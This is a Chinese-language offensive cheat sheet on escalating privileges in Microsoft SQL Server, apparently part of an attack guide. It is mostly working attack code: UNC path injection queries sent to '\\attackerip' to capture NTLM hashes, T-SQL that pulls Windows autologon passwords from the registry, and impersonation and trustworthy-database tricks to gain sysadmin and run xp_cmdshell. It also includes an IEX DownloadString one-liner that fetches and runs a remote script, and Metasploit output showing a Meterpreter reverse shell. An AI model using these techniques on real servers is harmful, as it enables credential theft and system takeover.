## 提权

|描述|查询语句|
|----|----|
|使用户成为DBA|EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin';|
|模拟登录|EXECUTE AS LOGIN = 'sa'; SELECT @@VERSION;|
|创建系统管理员用户|EXEC sp_addlogin 'user', 'pass';<br>EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin';|
|删除用户|EXEC sp_droplogin 'user';|
|检索SQL代理连接密码|exec msdb.dbo.sp_get_sqlagent_properties|
|检索DTS连接密码|select msdb.dbo.rtbldmbprops|
|检测模拟登录|SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'|

### 授予对所有自定义对象执行的权限

```sql
SELECT 'grant exec on ' + QUOTENAME(ROUTINE_SCHEMA) + '.' +
QUOTENAME(ROUTINE_NAME) + ' TO test' FROM INFORMATION_SCHEMA.ROUTINES
WHERE OBJECTPROPERTY(OBJECT_ID(ROUTINE_NAME),'IsMSShipped') = 0 ;
```

### 对所有存储过程授予执行权限

```sql
CREATE ROLE db_executor
GRANT EXECUTE TO db_executor
exec sp_addrolemember 'db_executor', 'YourSecurityAccount'
```

### UNC路径注入

```sql
这是默认情况下支持 UNC 路径 [注入] 的 SQL Server 命令列表。注入可用于捕获或重放用于运行 SQL Server 服务的 Windows 帐户的 NetNTLM 密码哈希。 默认情况下，SQL Server 服务帐户在所有版本的 SQL Server 中都具有 sysadmin 权限

-----------------------------------------------------------------------
-- 可通过公共固定服务器角色执行的 UNC 路径注入
-----------------------------------------------------------------------
-- 注意：SQL Server 2000 至 2016 均支持（不包括 azure）

-- XP_DIRTREE 扩展存储过程
-- 修复："将 xp_dirtree 上的执行撤销为公共"

xp_dirtree '\\attackerip\file'
GO

-- XP_FILEEXIST 扩展存储过程
-- 修复："将 xp_fileexist 上的执行撤销为公共"

xp_fileexist '\\attackerip\file'
GO

-- BACKUP 命令
-- 注意：Public 角色无法实际执行备份，但 UNC 路径会在授权检查之前解析。
-- 修复：https://technet.microsoft.com/library/security/MS16-136、https://technet.microsoft.com/en-us/library/security/mt674627.aspx
-- 修正说明：没有适用于 SQL Server 2000 至 2008 的补丁，因为它们不再受支持

BACKUP LOG [TESTING] TO DISK = '\\attackerip\file'
GO

BACKUP DATABASE [TESTING] TO DISK = '\\attackeri\file'
GO

-- RESTORE 命令
-- 注意：Public 角色实际上无法执行 RESTORE，但 UNC 路径会在授权检查之前解析。
-- 修复：https://technet.microsoft.com/library/security/MS16-136、https://technet.microsoft.com/en-us/library/security/mt674627.aspx
-- 修正说明：没有适用于 SQL Server 2000 至 2008 的补丁，因为它们不再受支持

RESTORE LOG [TESTING] FROM DISK = '\\attackerip\file'
GO

RESTORE DATABASE [TESTING] FROM DISK = '\\attackerip\file'
GO

RESTORE HEADERONLY FROM DISK = '\\attackerip\file'
GO

RESTORE FILELISTONLY FROM DISK = '\\attackerip\file'
GO

RESTORE LABELONLY FROM DISK = '\\attackerip\file'
GO

RESTORE REWINDONLY FROM DISK = '\\attackerip\file'
GO

RESTORE VERIFYONLY FROM DISK = '\\attackerip\file'
GO

------------------------------------------------------
-- 由 Sysadmin 固定服务器执行
-- 以及其他非公共 roles / privileges
------------------------------------------------------
--注意：几乎每个支持文件路径的函数和存储过程在设计上都允许 UNC 路径

-- 创建 assembly
CREATE ASSEMBLY HelloWorld FROM '\\attackerip\file' WITH PERMISSION_SET = SAFE;  
GO

-- 添加扩展存储过程
sp_addextendedproc 'xp_hello','\\attackerip\file'

-- 创建证书
CREATE CERTIFICATE testing123  
    FROM EXECUTABLE FILE = '\\attackerip\file';
GO  

-- 备份证书
BACKUP CERTIFICATE test01 TO FILE = '\\attackerip\file'
	WITH PRIVATE KEY (decryption by password = 'superpassword',
	FILE = '\\attackerip\file',
	encryption by password = 'superpassword');
go

-- 备份到文件 - 主密钥
BACKUP MASTER KEY TO FILE = '\\attackerip\file'
	ENCRYPTION BY PASSWORD = 'password'
GO

-- 备份到文件 - 服务主密钥
BACKUP SERVICE MASTER KEY TO FILE = '\\attackerip\file'
	ENCRYPTION BY PASSWORD = 'password'
go

-- 从文件恢复 - 主密钥
RESTORE MASTER KEY FROM FILE = '\\attackerip\file'
	DECRYPTION BY PASSWORD = 'password'
	ENCRYPTION BY PASSWORD = 'password'
go

--从文件恢复 - 服务主密钥
RESTORE SERVICE MASTER KEY FROM FILE = '\\attackerip\file'
	DECRYPTION BY PASSWORD = 'password'
go

-- 从文件读取数据 - 批量插入 1
CREATE TABLE #TEXTFILE (column1 NVARCHAR(100))
BULK INSERT #TEXTFILE FROM '\\attackerip\file'
DROP TABLE #TEXTFILE

-- 从文件读取数据 - 批量插入 2
CREATE TABLE #TEXTFILE (column1 NVARCHAR(100))
BULK INSERT #TEXTFILE FROM '\\attackerip\file'
WITH (FORMATFILE = '\\testing21\file')
DROP TABLE #TEXTFILE

-- 从文件读取数据 - fn_xe_file_target_read_file
SELECT * FROM sys.fn_xe_file_target_read_file ('\\attackerip\file','\\attackerip\file',null,null)
GO

-- 从文件读取数据 - fn_get_audit_file
SELECT * FROM sys.fn_get_audit_file ('\\attackerip\file','\\attackerip\file',default,default);  
GO  

-- 创建服务器审核文件
CREATE SERVER AUDIT TESTING TO FILE ( FILEPATH = '\\attackerip\file');
GO

-- 安装加密提供程序  
sp_configure 'EKM provider enabled',1
RECONFIGURE
GO
CREATE CRYPTOGRAPHIC PROVIDER SecurityProvider FROM FILE = '\\attackerip\file';  
GO

-- 外部文件格式 - 仅限 Azure
CREATE EXTERNAL FILE FORMAT myfileformat WITH (FORMATFILE = '\\testing21\file');
GO

-- xp_subdirs
xp_subdirs '\\attackerip\file'

-- xp_cmdshell
xp_cmdshell 'dir \\attackerip\file'


-- OpenRowSet
一般注意事项：
- 2k5 及以上
- 必须是系统管理员。 运行下面的 TSQL 可用于捕获 SQL Server 服务帐户密码哈希值。
- 也可用于在远程 SQL Server 上透明地执行命令； 如果服务器共享一个服务帐户并且以系统管理员身份运行。 这只是以一种新的方式利用共享服务帐户。

EXEC sp_configure 'show advanced options', 1
RECONFIGURE
GO
EXEC sp_configure 'ad hoc distributed queries', 1
RECONFIGURE
GO

-- 如果是系统管理员，通过 sql 服务身份验证
DECLARE @sql NVARCHAR(MAX)
set @sql = 'select a.* from openrowset(''SQLNCLI'', ''Server=evilserver;Trusted_Connection=yes;'', ''select * from master.dbo.sysdatabases'') as a'
select @sql
EXEC sp_executeSQL @sql

--Excel 2007-2010 (unc 注入)
-- 需要启用临时查询，但可以通过任何登录运行
SELECT * --INTO #productlist
FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0',
    'Excel 12.0 Xml;HDR=YES;Database=\\server\temp\Products.xlsx',
    'SELECT * FROM [ProductList$]');

--Excel 97-2003(unc 注入)
-- 需要启用临时查询，但可以通过任何登录运行
SELECT * --INTO #productlist
FROM OPENROWSET('Microsoft.Jet.OLEDB.4.0',
    'Excel 8.0;HDR=YES;Database=\\server\temp\Products.xls',
    'select * from [ProductList$]');

源自: https://www.experts-exchange.com/articles/3025/Retrieving-Data-From-Excel-Using-OPENROWSET.html

--带有新 ACE 驱动程序的旧 Excel - 工作查询 1（unc 注入）
SELECT * --INTO #productlist
FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0',
    'Excel 8.0;HDR=YES;Database=\\server\temp\Products.xls',
    'SELECT * FROM [ProductList$]');

--带有新 ACE 驱动程序的旧 Excel - 工作查询 2（unc 注入）
SELECT * --INTO #productlist
FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0',
    'Excel 12.0;HDR=YES;Database=\\server\temp\Products.xls',
    'SELECT * FROM [ProductList$]');

--(unc 注入)
SELECT * --INTO #productlist
FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0',
    'Excel 12.0 Xml;HDR=YES;Database=\\server\temp\Products.xlsx',
    'SELECT * FROM [ProductList$]');

-- 需要 sysadmin 或 db_owner 角色
SELECT  * FROM fn_dump_dblog(NULL,NULL,'DISK',1
,'\\attackerip\fakefile.bak'
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,   NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,   NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,   NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,   NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL,   NULL,NULL,NULL,NULL,NULL,NULL
,NULL,NULL,NULL,NULL)

--开放数据源
-- 适用于 2k8 以来的所有内容，需要启用即席查询，但随后可以通过任何登录来运行
- 参考：https://msdn.microsoft.com/en-us/library/ms179856.aspx
SELECT * FROM OPENDATASOURCE('Microsoft.Jet.OLEDB.4.0','Data Source=\\server1\DataFolder\Documents\TestExcel.xls;Extended Properties=EXCEL 5.0')...[Sheet1$] ;

-- Web Dav 笔记
xp_dirtree '\\hostname@SSL\test' --ssl 443
xp_dirtree '\\hostname@SSL@1234\test' --ssl port 1234
xp_dirtree '\\hostname@1234\test' --http
```

### 创建系统管理员用户

```sql
USE [master]
GO
CREATE LOGIN [test] WITH PASSSWORD=N 'test', DEFAULT_DATABASE=[master], CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF
GO
EXEC master..sp_addsrvrolemember @loginame=N'test', @rolename=N'sysadmin'
GO
```

### 模拟SQL Server服务账户

根据实例名称模拟SQL Server服务账户

需要本地管理员权限才能够以系统管理员身份针对本地SQL Server实例

```bash
加载PowerShel模块
PS C:> IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1")

列出本地系统上第一个可用的SQL Server实例
PS C:> Get-SQLInstanceLocal | Select-Object -First 1
ComputerName       : MSSQLSRV04
Instance           : MSSQLSRV04BOSCHSQL
ServiceDisplayName : SQL Server (BOSCHSQL)
ServiceName        : MSSQL$BOSCHSQL
ServicePath        : "C:Program FilesMicrosoft SQL ServerMSSQL12.BOSCHSQLMSSQLBinnsqlservr.exe" -sBOSCHSQL
ServiceAccount     : NT ServiceMSSQL$BOSCHSQL
State              : Running

验证本地管理员对本地SQL Server实例是否含有sysadmin权限
PS C:> Get-SQLServerInfo -Verbose -Instance MSSQLSRV04BOSCHSQL
VERBOSE: MSSQLSRV04BOSCHSQL : Connection Success.
ComputerName           : MSSQLSRV04
Instance               : MSSQLSRV04BOSCHSQL
DomainName             : DEMO
ServiceProcessID       : 1620
ServiceName            : MSSQL$BOSCHSQL
ServiceAccount         : NT ServiceMSSQL$BOSCHSQL
AuthenticationMode     : Windows and SQL Server Authentication
Clustered              : No
SQLServerVersionNumber : 12.0.4100.1
SQLServerMajorVersion  : 2014
SQLServerEdition       : Developer Edition (64-bit)
SQLServerServicePack   : SP1
OSArchitecture         : X64
OsVersionNumber        : 6.2
Currentlogin           : DEMOAdministrator
IsSysadmin             : No
ActiveSessions         : 1

模拟目标实例的 SQL Server服务账户
PS C:> Invoke-SQLImpersonateService -Verbose -Instance MSSQLSRV04BOSCHSQL
VERBOSE: MSSQLSRV04BOSCHSQL : DEMOadministrator has local admin privileges.
VERBOSE: MSSQLSRV04BOSCHSQL : Impersonating SQL Server process:
VERBOSE: MSSQLSRV04BOSCHSQL : - Process ID: 1620
VERBOSE: MSSQLSRV04BOSCHSQL : - Service Account: NT ServiceMSSQL$BOSCHSQL
VERBOSE: MSSQLSRV04BOSCHSQL : Successfully queried thread token
VERBOSE: MSSQLSRV04BOSCHSQL : Successfully queried thread token
VERBOSE: MSSQLSRV04BOSCHSQL : Selecting token by Process object
VERBOSE: MSSQLSRV04BOSCHSQL : Done.

验证是否成功
PS C:> Get-SQLServerInfo -Verbose -Instance MSSQLSRV04BOSCHSQL
VERBOSE: MSSQLSRV04BOSCHSQL : Connection Success.
ComputerName           : MSSQLSRV04
Instance               : MSSQLSRV04BOSCHSQL
DomainName             : DEMO
ServiceProcessID       : 1620
ServiceName            : MSSQL$BOSCHSQL
ServiceAccount         : NT ServiceMSSQL$BOSCHSQL
AuthenticationMode     : Windows and SQL Server Authentication
Clustered              : No
SQLServerVersionNumber : 12.0.4100.1
SQLServerMajorVersion  : 2014
SQLServerEdition       : Developer Edition (64-bit)
SQLServerServicePack   : SP1
OSArchitecture         : X64
OsMachineType          : ServerNT
OSVersionName          : Windows Server 2012 Standard
OsVersionNumber        : 6.2
CurrentLogin           : NT ServiceMSSQL$BOSCHSQL
IsSysadmin             : Yes
ActiveSessions         : 1

恢复到原始账户
PS C:> Invoke-SQLImpersonateService -Verbose -Rev2Self
```

### 转储Windows自动登录密码

该方法使用使用 xp_regread 扩展存储过程来转储Windows自动登录密码

xp_regread 扩展存储过程自 SQL Server 2000 以来就已存在。原始版本允许公共服务器角色的成员访问 SQL Server 服务帐户有权访问的几乎所有内容。xp_regread允许我们从注册表中提取敏感数据，而无需启用 xp_cmdshell。

在大多数情况下，当 Windows 配置为自动登录时，未加密的凭据存储在注册表项中：

```bash
HKEY_LOCAL_MACHINE SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

编写TSQL脚本使用 xp_regread 为我们从注册表中提取自动登录凭据（由于注册表路径不在允许的列表中，我们必须以系统管理员身份运行查询）：

```sql
-------------------------------------------------------------------------
-- Get Windows Auto Login Credentials from the Registry
-------------------------------------------------------------------------

-- Get AutoLogin Default Domain
DECLARE @AutoLoginDomain  SYSNAME
EXECUTE master.dbo.xp_regread
@rootkey        = N'HKEY_LOCAL_MACHINE',
@key            = N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
@value_name        = N'DefaultDomainName',
@value            = @AutoLoginDomain output

-- Get AutoLogin DefaultUsername
DECLARE @AutoLoginUser  SYSNAME
EXECUTE master.dbo.xp_regread
@rootkey        = N'HKEY_LOCAL_MACHINE',
@key            = N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
@value_name        = N'DefaultUserName',
@value            = @AutoLoginUser output

-- Get AutoLogin DefaultUsername
DECLARE @AutoLoginPassword  SYSNAME
EXECUTE master.dbo.xp_regread
@rootkey        = N'HKEY_LOCAL_MACHINE',
@key            = N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
@value_name        = N'DefaultPassword',
@value            = @AutoLoginPassword output

-- Display Results
SELECT @AutoLoginDomain, @AutoLoginUser, @AutoLoginPassword
```

命令示例：

```sql
PS C:\> $Accessible = Get-SQLInstanceDomain –Verbose | Get-SQLConnectionTestThreaded –Verbose -Threads 15| Where-Object {$_.Status –eq "Accessible"}
PS C:\> $Accessible | Get-SQLRecoverPwAutoLogon -Verbose
VERBOSE: SQLServer1.demo.local\Instance1 : Connection Success.
VERBOSE: SQLServer2.demo.local\Application : Connection Success.
VERBOSE: SQLServer2.demo.local\Application : This function requires sysadmin privileges. Done.
VERBOSE: SQLServer3.demo.local\2014 : Connection Success.
VERBOSE: SQLServer3.demo.local\2014 : This function requires sysadmin privileges. Done.

ComputerName : SQLServer1
Instance     : SQLServer1\Instance1
Domain       : demo.local
UserName     : KioskAdmin
Password     : test

ComputerName : SQLServer1
Instance     : SQLServer1\Instance1
Domain       : demo.local
UserName     : kioskuser
Password     : KioskUserPassword!
```

### 非系统管理员执行

该方法允许非系统管理员登录使用 xp_regwrite 访问敏感注册表位置

```sql
假设
--------
授予公共角色成员执行 xp_regwrite 的权限.

GRANT EXEC ON OBJECT::master.dbo.xp_regwrite TO [Public]

问题
-----
默认情况下，非系统管理员登录只能对以下注册表项目使用 xp_regwrite。

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft SQL Server\<INSTANCE>
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\SQLAgent$<INSTANCE>
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft SQL Server\80\Replication

写入权限是递归的，但以下情况除外:
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL12.STANDARDDEV2014\MSSQLServer\ExtendedProcedures

解决方案
--------
存在未记录的注册表项，允许管理员设置可写入的注册表位置白名单
由非系统管理员通过 xp_regwrite 登录。只需将想要列入白名单的注册表位置添加到下面的注册表项即可。

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL12.STANDARDDEV2014\MSSQLServer\ExtendedProcedures\
Xp_regread Allowed Paths
REG_MULTI_SZ

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL12.STANDARDDEV2014\MSSQLServer\ExtendedProcedures\
Xp_regwrite Allowed Paths
REG_MULTI_SZ
```

### 可信数据库

将系统管理员拥有的数据库配置为可信数据库将允许特权用户提升其权限。在某些情况下，还可以提升非特权用户的权限

执行下面TSQL：

```sql
-- Create a stored procedure to add MyAppUser to sysadmin role
USE MyAppDb
GO
CREATE PROCEDURE sp_elevate_me
WITH EXECUTE AS OWNER
AS
EXEC sp_addsrvrolemember 'MyAppUser','sysadmin'
GO
```

```sql
验证MyAppUser是否为管理员：
SELECT is_srvrolemember('sysadmin')

执行存储过程将MyAppUser添加到sysadmin角色：
USE MyAppDb
EXEC sp_elevate_me

验证是否已添加：
SELECT is_srvrolemember('sysadmin')

现在我们就是管理员了，可以运行管理员命令：
EXEC master..xp_cmdshell 'whoami'
```

简单回顾下就是：

> + sa帐户是MyAppDb数据库的数据库所有者（DBO）
> + MyAppUser在MyAppDb数据库中具有b_owner角色，这为MyAppUser用户提供了该数据库中的管理权限
> + 由于MyAppUser帐户本质上是MyAppDb数据库的管理员，因此它可用于创建一个可以以所有者身份执行的存储过程

在上面的示例中，我们只是创建了一个存储过程来 EXECUTE AS OWNER（在本例中为sa），将MyAppUser添加到 sysadmin 角色

[PowerShell](https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1)自动执行：

```bash
Import-Module .Invoke-SqlServerDbElevateDbOwner.psm1
Invoke-SqlServerDbElevateDbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance 192.168.8.101
```

Metasploit:

```bash
use auxiliary/admin/mssql/mssql_esclate_dbowner
set rhost 172.20.10.2
set rport 1433
set username db1_owner
set password MyPassword!
```

然后就可以使用mssql_payload来获取shell：

```bash
msf exploit(mssql_payload) use exploit/windows/mssql/mssql_payload
msf exploit(mssql_payload) set rhost 172.20.10.2
rhost =172.20.10.2
msf exploit(mssql_payload) set rport 1433
rport =433
msf exploit(mssql_payload) set username db1_owner
username =db1_owner
msf exploit(mssql_payload) set password MyPassword!
password =   MyPassword!
msf exploit(mssql_payload) exploit

[*] Started reverse handler on 192.168.91.128:4444
[*] The server may have xp_cmdshell disabled, trying to enable it...
[*] Command Stager progress - 1.47% done (1499/102246 bytes)
...[SNIP]...
[*] Sending stage (769536 bytes) to 192.168.91.1
[*] Command Stager progress - 100.00% done (102246/102246 bytes)
[*] Meterpreter session 1 opened (192.168.91.128:4444 - 192.168.91.1:4175) at 2023-09-27 10:06:19 -0500

meterpreter    getuid
Server username: NT AUTHORITYSYSTEM
meterpreter   
```

### 存储过程用户模拟

首先，创建4个用户：

```sql
-- Create login 1
CREATE LOGIN MyUser1 WITH PASSWORD = 'MyPassword!';

-- Create login 2
CREATE LOGIN MyUser2 WITH PASSWORD = 'MyPassword!';

-- Create login 3
CREATE LOGIN MyUser3 WITH PASSWORD = 'MyPassword!';

-- Create login 4
CREATE LOGIN MyUser4 WITH PASSWORD = 'MyPassword!';
```

为MyUser1授予模拟MyUser2、3、sa的模拟权限：

```sql
-- Grant myuser1 impersonate privilege on myuser2, myuser3, and sa
USE master;
GRANT IMPERSONATE ON LOGIN::sa to [MyUser1];
GRANT IMPERSONATE ON LOGIN::MyUser2 to [MyUser1];
GRANT IMPERSONATE ON LOGIN::MyUser3 to [MyUser1];
GO
```

使用 MyUser1 登录名登录到 SQL Server，然后运行下面的查询以获取可由MyUser1登录名模拟的登录名列表：

```sql
-- Find users that can be impersonated
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
```

模拟识别的sa：

```sql
-- Verify you are still running as the myuser1 login
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')

-- Impersonate the sa login
EXECUTE AS LOGIN = 'sa'

-- Verify you are now running as the sa login
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

现在可以访问任何数据库并启用/运行 xp_cmdshell 以作为 SQL Service 服务帐户在操作系统上执行命令

```sql
-- Enable show options
EXEC sp_configure 'show advanced options',1
RECONFIGURE
GO

-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE
GO

-- Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'
```

一旦获取到系统管理员账户，就可以模拟任何数据库登录。

获取完整的登录列表：

```sql
-- Get a list of logins
SELECT * FROM master.sys.sysusers
WHERE islogin = 1
```

模拟MyUser4：

```sql
-- Verify you are still impersonating sa
select SYSTEM_USER
select IS_SRVROLEMEMBER('sysadmin')

-- Impersonate MyUser4
EXECUTE AS LOGIN = 'MyUser4'

-- Verify you are now running as the the MyUser4 login
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')

-- Change back to sa
REVERT
```

当然，你也可以模拟AD域用户：

```sql
-- Get the domain of the SQL Server
SELECT DEFAULT_DOMAIN()

-- Impersonate the domain administrator
EXECUTE AS LOGIN = 'SNOWWOLF\Administrator'

-- Verify you are now running as the Domain Admin
SELECT SYSTEM_USER
```

恢复初始登录状态：

```sql
-- Revert to your original login
REVERT

-- Verify you are now running as the MyUser1 login
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

Metasploit提供了模块以简化操作：

> mssql_escalate_executeas
> mssql_escalate_executeas_sqli

[PowerShell](https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-ExecuteAs.psm1)

```bash
Import-Module .Invoke-SqlServer-Escalate-ExecuteAs.psm1
Invoke-SqlServer-Escalate-ExecuteAs -SqlServerInstance 192.168.8.101 -SqlUser myuser1 -SqlPass MyPassword!
```

字典：

[实例](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/sql%20server%20default.txt)

[密码](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/sql%20server%20password.txt)
